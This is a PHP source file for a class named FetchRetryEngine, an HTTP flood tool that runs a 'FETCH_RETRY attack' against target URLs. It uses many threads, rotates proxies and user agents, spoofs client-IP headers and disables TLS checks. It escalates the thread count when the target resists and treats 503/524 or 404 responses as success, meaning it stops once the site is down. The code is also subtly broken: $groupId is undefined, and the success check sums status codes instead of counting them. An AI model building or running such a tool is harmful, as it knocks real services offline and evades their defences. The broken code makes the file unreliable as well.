<?php

require_once __DIR__ . '/../database.php';
require_once __DIR__ . '/../stealth_engine_class.php';
require_once __DIR__ . '/../client_profile_class.php';
require_once __DIR__ . '/../tls_profile_class.php';
require_once __DIR__ . '/../proxy_manager_class.php';

class FetchRetryEngine {
    private $db;
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'FETCH_RETRY',
            'threads' => 50,
            'duration' => 300,
            'request_rate' => 150,
            'retry_attempts' => 10,
            'retry_delay_min' => 100,
            'retry_delay_max' => 2000,
            'exponential_backoff' => true,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'connection_reuse' => false,
            'timeout_escalation' => true,
            'persistent_retry' => true,
            'failure_threshold' => 0.8,
            'escalation_factor' => 1.3
        ];
    }
    
    public function start($targets, $stealthSessionId = null) {
        $this->logMessage("Starting FETCH_RETRY attack on " . count($targets) . " targets");
        
        if ($this->config['stealth_enabled'] && $stealthSessionId) {
            $this->stealthEngine = new StealthEngine();
            $this->stealthEngine->loadSession($stealthSessionId);
        }
        
        $results = [];
        $startTime = time();
        
        foreach ($targets as $target) {
            $results[$target] = $this->executeRetryAttack($target, $startTime);
        }
        
        return [
            'status' => 'completed',
            'method' => 'FETCH_RETRY',
            'targets' => count($targets),
            'results' => $results,
            'total_requests' => array_sum(array_column($results, 'total_requests')),
            'total_retries' => array_sum(array_column($results, 'total_retries')),
            'success_rate' => $this->calculateOverallSuccessRate($results)
        ];
    }
    
    private function executeRetryAttack($target, $startTime) {
        $this->logMessage("Executing FETCH_RETRY attack on $target");
        
        $totalRequests = 0;
        $totalRetries = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                $requestResult = $this->performRetryRequest($target);
                $totalRequests++;
                $totalRetries += $requestResult['retry_count'];
                
                if ($requestResult['success']) {
                    $successCount++;
                } else {
                    $errorCodes[] = $requestResult['status_code'];
                }
                
                if ($this->config['stealth_enabled'] && $totalRequests % 25 === 0) {
                    $this->rotateStealthComponents();
                }
                
                usleep(rand(50000, 200000));
            }
            
            if ($this->shouldEscalate($errorCodes, $totalRequests)) {
                $currentThreads = $currentThreads * $this->config['escalation_factor'];
                $this->logMessage("Escalated threads to $currentThreads for $target due to resistance");
            }
            
            if ($totalRequests % 100 === 0) {
                $this->logProgress($target, $totalRequests, $totalRetries, $successCount);
            }
        }
        
        return [
            'target' => $target,
            'total_requests' => $totalRequests,
            'total_retries' => $totalRetries,
            'success_count' => $successCount,
            'success_rate' => $totalRequests > 0 ? $successCount / $totalRequests : 0,
            'error_codes' => array_count_values($errorCodes),
            'final_threads' => $currentThreads
        ];
    }
    
    private function performRetryRequest($target) {
        $retryCount = 0;
        $maxRetries = $this->config['retry_attempts'];
        $baseDelay = $this->config['retry_delay_min'];
        
        while ($retryCount <= $maxRetries) {
            $headers = $this->buildHeaders();
            $proxy = $this->config['proxy_rotation'] ? $this->proxyManager->getActiveProxy() : null;
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $target,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_USERAGENT => $this->clientProfile->getCurrentUserAgent(),
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_FRESH_CONNECT => !$this->config['connection_reuse']
            ]);
            
            if ($proxy) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
                if (isset($proxy['auth'])) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
                }
            }
            
            $response = curl_exec($ch);
            $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            curl_close($ch);
            
            if ($response !== false && $statusCode >= 200 && $statusCode < 400) {
                return [
                    'success' => true,
                    'status_code' => $statusCode,
                    'retry_count' => $retryCount,
                    'response_size' => strlen($response)
                ];
            }
            
            $retryCount++;
            
            if ($retryCount <= $maxRetries) {
                $delay = $this->config['exponential_backoff'] 
                    ? $baseDelay * pow(2, $retryCount - 1)
                    : rand($this->config['retry_delay_min'], $this->config['retry_delay_max']);
                
                usleep($delay * 1000);
                
                if ($this->config['proxy_rotation']) {
                    $this->proxyManager->rotateProxy();
                }
                if ($this->config['ua_rotation']) {
                    $this->clientProfile->rotateUserAgent();
                }
            }
        }
        
        return [
            'success' => false,
            'status_code' => $statusCode ?? 0,
            'retry_count' => $retryCount,
            'error' => $error ?? 'Max retries exceeded'
        ];
    }
    
    private function buildHeaders() {
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1'
        ];
        
        if ($this->config['header_spoofing']) {
            $headers[] = 'X-Forwarded-For: ' . $this->generateRandomIP();
            $headers[] = 'X-Real-IP: ' . $this->generateRandomIP();
            $headers[] = 'X-Originating-IP: ' . $this->generateRandomIP();
            $headers[] = 'Cache-Control: no-cache';
            $headers[] = 'Pragma: no-cache';
        }
        
        return $headers;
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldEscalate($errorCodes, $requestCount) {
        if ($requestCount < 50) return false;
        
        $recentErrors = array_slice($errorCodes, -20);
        $errorRate = count($recentErrors) / min(20, $requestCount);
        
        return $errorRate > $this->config['failure_threshold'];
    }
    
    private function calculateOverallSuccessRate($results) {
        $totalRequests = array_sum(array_column($results, 'total_requests'));
        $totalSuccess = array_sum(array_column($results, 'success_count'));
        
        return $totalRequests > 0 ? $totalSuccess / $totalRequests : 0;
    }
    
    private function logProgress($target, $requests, $retries, $success) {
        $successRate = $requests > 0 ? round(($success / $requests) * 100, 2) : 0;
        $this->logMessage("FETCH_RETRY Progress - Target: $target, Requests: $requests, Retries: $retries, Success: {$successRate}%");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = __DIR__ . '/../../logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] FETCH_RETRY_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
